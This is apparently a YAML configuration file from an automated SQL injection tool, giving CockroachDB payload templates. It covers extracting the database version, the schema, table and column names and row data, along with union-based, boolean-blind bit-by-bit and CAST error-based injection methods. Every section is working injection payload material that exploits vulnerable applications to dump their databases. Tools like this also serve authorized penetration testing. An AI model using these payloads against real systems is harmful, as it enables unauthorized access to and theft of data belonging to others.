vendor: 
resource: 
 info: |
  concat_ws(
      '${ENCLOSE_VALUE_SQL}',
      version(),
      current_database(),
      '-'
  )
  || '${TRAIL_SQL}'
  
 schema: 
  database: |
   select 
       concat_agg(
           '${ENCLOSE_VALUE_SQL}'
           || r
           || '${SEPARATOR_QTE_SQL}'
           || q::text
           || '${ENCLOSE_VALUE_SQL}'
           || '${SEPARATOR_CELL_SQL}'
       )
       || '${TRAIL_SQL}'
   from (
       SELECT
           tables.table_schema r,
           count(table_name) q
       FROM information_schema.tables
       group by 1
       order by 1
       {limit}
   ) x
   
  table: |
   select
       concat_agg(
           '${ENCLOSE_VALUE_SQL}'
           || r
           || '${SEPARATOR_QTE_SQL}'
           || q::text
           || '${ENCLOSE_VALUE_SQL}'
           || '${SEPARATOR_CELL_SQL}'
       )
       || '${TRAIL_SQL}'
   from (
       SELECT 
           tables.table_name r,
           '0' q
       FROM information_schema.tables
       where tables.TABLE_SCHEMA = '${DATABASE}'
       order by 1
       {limit}
   ) x
   
  column: |
   select 
       concat_agg(
           '${ENCLOSE_VALUE_SQL}'
           || r
           || '${SEPARATOR_QTE_SQL}'
           || q::text
           || '${ENCLOSE_VALUE_SQL}'
           || '${SEPARATOR_CELL_SQL}'
       )
       || '${TRAIL_SQL}'
   from (
       SELECT 
           columns.column_name r, 
           '0' q
       FROM information_schema.columns
       where columns.TABLE_SCHEMA = '${DATABASE}'
       and columns.TABLE_name = '${TABLE}'
       order by 1
       {limit}
   )x
   
  row: 
   query: |
    select 
        concat_agg(
            '${ENCLOSE_VALUE_SQL}'
            || r
            || '${SEPARATOR_QTE_SQL}'
            || q::text
            || '${ENCLOSE_VALUE_SQL}'
            || '${SEPARATOR_CELL_SQL}'
        )
        || '${TRAIL_SQL}'
    from (
        SELECT 
            substr((${FIELDS}), 1, 775) r,
            count(*) q
        FROM ${DATABASE}.${TABLE}
        group by 1
        {limit}
    )x
   fields: 
    field: trim(coalesce(${FIELD}::text, ''))
    concat: "|| '%7f' ||"
    
strategy: 
 configuration: 
  slidingWindow: |
   select
       /**
        * If reach end of string (${LEAD}i) then NULLIF nullifies the result
        */
       '${LEAD}'
       || NULLIF(
           substr(
               (${INJECTION}),
               ${INDEX},
               65536
           ),
           '${TRAIL_SQL}'
       )
  limit: limit 65536 offset ${LIMIT}
  failsafe: (1337${INDICE}7330%2b1)::text
  calibrator: repeat('%23', 1024)
  limitBoundary: 0
  endingComment: --+-
  fingerprint: 
   errorMessage: 
    - cockroachdb
    
 normal: 
  indices: union select ${INDICES}
  capacity: (select '${LEAD}${INDICE}' || ${CALIBRATOR})
  orderBy: order by 1337
  
 boolean: 
  test: 
   falses: 
    - true = false
    - true %21= true
    - false %21= false
    - 1 = 2
    - 1 %21= 1
    - 2 %21= 2
   trues: 
    - true = true
    - false = false
    - true %21= false
    - 1 = 1
    - 2 = 2
    - 1 %21= 2
   initialization: 0%2b1 = 1
   bit: |
    /**
     * true bit return bit, false bit return 0
     * 8 & 8 = 8, 8 & 4 = 0
     */
    0 != (
        ascii(
            substr(
                (${INJECTION}), 
                ${INDEX}, 
                1
            )
        ) 
        %26 ${BIT}
    )
   length: length((${INJECTION})) > ${INDEX}
  blind: and ${TEST}
  
 error: 
  method: 
   - name: CAST::text_numeric
     query: |
      /* Require FALSE statement, then OR */
      and 1 = 0 
      or 1 = CAST(
          (${WINDOW})::text 
          AS NUMERIC
      )
     capacity: 255